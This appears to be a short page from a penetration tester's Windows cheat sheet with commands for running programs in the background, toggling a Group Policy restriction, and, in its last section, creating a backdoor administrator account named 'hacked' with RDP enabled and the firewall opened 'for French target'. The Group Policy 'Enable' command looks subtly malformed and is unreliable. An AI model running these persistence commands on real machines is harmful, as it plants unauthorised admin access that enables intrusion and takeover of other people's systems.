###############
Useful Commands
###############

* https://www.winpcap.org/windump/default.htm
* https://www.microolap.com/products/network/tcpdump/

Run Executable in Background
============================

.. code-block:: none

    start /B program

Disable/Enable Group Policy
===========================

Disable:

.. code-block:: none

    REG add "HKCU\Software\Policies\Microsoft\MMC{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /t REG_DWORD /d 1 /f

Enable:

.. code-block:: none

    REG add "HKCU\Software\Policies\Microsoft\MMC{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /0 REG_DWORD /d 1 /f

Add Admin & Enable RDP
======================

.. code-block:: none

    net user /add hacked Password1
    net localgroup administrators hacked /add
    net localgroup Administrateurs hacked /add (For French target)
    net localgroup "Remote Desktop Users" hacked /add
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
    netsh firewall set service type = REMOTEDESKTOP mode = ENABLE scope = CUSTOM addresses = 10.0.0.1
